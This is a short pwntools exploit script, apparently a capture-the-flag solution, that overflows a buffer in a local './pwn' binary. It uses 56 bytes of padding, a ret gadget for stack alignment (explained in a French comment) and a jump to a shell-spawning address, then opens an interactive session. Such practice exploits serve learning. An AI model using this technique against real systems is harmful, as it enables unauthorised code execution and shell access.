from pwn import * 

context.log_level = 'info'

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process('./pwn')

offset = 56

ret   = 0x401016   #il faut se realigner a cause de push rbp qui nous aligne a -8 donc on realigne avec ret   (OPgadget --binary ./pwn | grep ': ret$')
shell = 0x4011a2

log.info(p64(shell))

payload = b'A' * offset + p64(ret) + p64(shell)
log.info(payload)

io.sendline(payload)
io.interactive()